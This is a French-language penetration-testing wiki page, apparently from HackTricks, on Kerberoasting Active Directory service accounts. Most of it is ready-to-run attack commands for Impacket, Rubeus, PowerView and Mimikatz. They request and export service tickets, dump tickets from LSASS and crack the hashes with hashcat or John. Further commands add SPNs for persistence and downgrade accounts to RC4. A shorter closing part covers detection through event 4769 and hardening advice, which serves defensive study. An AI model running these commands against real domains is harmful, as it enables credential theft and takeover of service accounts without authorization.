# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting se concentre sur l'acquisition de tickets TGS, spécifiquement ceux liés aux services fonctionnant sous des comptes d'utilisateur dans Active Directory (AD), à l'exclusion des comptes d'ordinateur. Le chiffrement de ces tickets utilise des clés qui proviennent des mots de passe des utilisateurs, permettant ainsi le craquage des identifiants hors ligne. L'utilisation d'un compte utilisateur en tant que service est indiquée par une propriété ServicePrincipalName (SPN) non vide.

Tout utilisateur authentifié du domaine peut demander des tickets TGS, donc aucun privilège spécial n'est nécessaire.

### Points Clés

- Cible les tickets TGS pour les services qui s'exécutent sous des comptes d'utilisateur (c'est-à-dire, des comptes avec SPN défini ; pas des comptes d'ordinateur).
- Les tickets sont chiffrés avec une clé dérivée du mot de passe du compte de service et peuvent être craqués hors ligne.
- Aucun privilège élevé requis ; tout compte authentifié peut demander des tickets TGS.

> [!WARNING]
> La plupart des outils publics préfèrent demander des tickets de service RC4-HMAC (etype 23) car ils sont plus rapides à craquer que l'AES. Les hachages TGS RC4 commencent par `$krb5tgs$23$*`, AES128 par `$krb5tgs$17$*`, et AES256 par `$krb5tgs$18$*`. Cependant, de nombreux environnements passent uniquement à l'AES. Ne supposez pas que seul RC4 est pertinent.
> Évitez également le roasting "spray-and-pray". Le kerberoast par défaut de Rubeus peut interroger et demander des tickets pour tous les SPN et est bruyant. Énumérez et ciblez d'abord les principaux intéressants.

### Attaque

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Outils multi-fonction incluant des vérifications kerberoast :
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Énumérer les utilisateurs susceptibles d'être kerberoastés
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1 : Demander un TGS et extraire de la mémoire
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technique 2 : Outils automatiques
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Une demande TGS génère l'événement de sécurité Windows 4769 (Un ticket de service Kerberos a été demandé).

### OPSEC et environnements uniquement AES

- Demandez RC4 intentionnellement pour les comptes sans AES :
- Rubeus : `/rc4opsec` utilise tgtdeleg pour énumérer les comptes sans AES et demande des tickets de service RC4.
- Rubeus : `/tgtdeleg` avec kerberoast déclenche également des demandes RC4 lorsque cela est possible.
- Rôtissez les comptes uniquement AES au lieu d'échouer silencieusement :
- Rubeus : `/aes` énumère les comptes avec AES activé et demande des tickets de service AES (etype 17/18).
- Si vous détenez déjà un TGT (PTT ou d'un .kirbi), vous pouvez utiliser `/ticket:<blob|path>` avec `/spn:<SPN>` ou `/spns:<file>` et sauter LDAP.
- Ciblage, limitation et moins de bruit :
- Utilisez `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` et `/jitter:<1-100>`.
- Filtrez pour des mots de passe probablement faibles en utilisant `/pwdsetbefore:<MM-dd-yyyy>` (anciens mots de passe) ou ciblez des OUs privilégiés avec `/ou:<DN>`.

Exemples (Rubeus) :
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Craquage
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistance / Abus

Si vous contrôlez ou pouvez modifier un compte, vous pouvez le rendre kerberoastable en ajoutant un SPN :
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Rétrograder un compte pour activer RC4 afin de faciliter le craquage (nécessite des privilèges d'écriture sur l'objet cible) :
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
Vous pouvez trouver des outils utiles pour les attaques kerberoast ici : https://github.com/nidem/kerberoast

Si vous trouvez cette erreur sous Linux : `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, cela est dû à un décalage horaire local. Synchronisez avec le DC :

- `ntpdate <DC_IP>` (déprécié sur certaines distributions)
- `rdate -n <DC_IP>`

### Détection

Le kerberoasting peut être furtif. Recherchez l'ID d'événement 4769 des DC et appliquez des filtres pour réduire le bruit :

- Exclure le nom de service `krbtgt` et les noms de service se terminant par `$` (comptes d'ordinateur).
- Exclure les demandes provenant de comptes machines (`*$$@*`).
- Seulement les demandes réussies (Code d'échec `0x0`).
- Suivre les types de chiffrement : RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Ne pas alerter uniquement sur `0x17`.

Exemple de triage PowerShell :
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Idées supplémentaires :

- Établir une utilisation normale des SPN par hôte/utilisateur ; alerter sur de grandes rafales de demandes SPN distinctes provenant d'un seul principal.
- Signaler une utilisation inhabituelle de RC4 dans des domaines renforcés par AES.

### Atténuation / Renforcement

- Utiliser gMSA/dMSA ou des comptes machines pour les services. Les comptes gérés ont des mots de passe aléatoires de plus de 120 caractères et se renouvellent automatiquement, rendant le craquage hors ligne impraticable.
- Appliquer AES sur les comptes de service en définissant `msDS-SupportedEncryptionTypes` sur AES uniquement (décimal 24 / hex 0x18) puis en faisant tourner le mot de passe afin que les clés AES soient dérivées.
- Dans la mesure du possible, désactiver RC4 dans votre environnement et surveiller les tentatives d'utilisation de RC4. Sur les DC, vous pouvez utiliser la valeur de registre `DefaultDomainSupportedEncTypes` pour orienter les valeurs par défaut pour les comptes sans `msDS-SupportedEncryptionTypes` défini. Tester de manière approfondie.
- Supprimer les SPN inutiles des comptes utilisateurs.
- Utiliser des mots de passe de compte de service longs et aléatoires (plus de 25 caractères) si les comptes gérés ne sont pas réalisables ; interdire les mots de passe courants et auditer régulièrement.

### Kerberoast sans un compte de domaine (STs demandés par AS)

En septembre 2022, Charlie Clark a montré que si un principal ne nécessite pas de pré-authentification, il est possible d'obtenir un ticket de service via un KRB_AS_REQ conçu en modifiant le sname dans le corps de la demande, obtenant ainsi un ticket de service au lieu d'un TGT. Cela reflète le AS-REP roasting et ne nécessite pas de crédentiels de domaine valides.

Voir les détails : article de Semperis “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Vous devez fournir une liste d'utilisateurs car sans crédentiels valides, vous ne pouvez pas interroger LDAP avec cette technique.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Lié

Si vous ciblez des utilisateurs AS-REP roastable, voir aussi :

{{#ref}}
asreproast.md
{{#endref}}

## Références

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – Les conseils de Microsoft pour aider à atténuer le Kerberoasting : https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Documentation sur Rubeus Roasting : https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
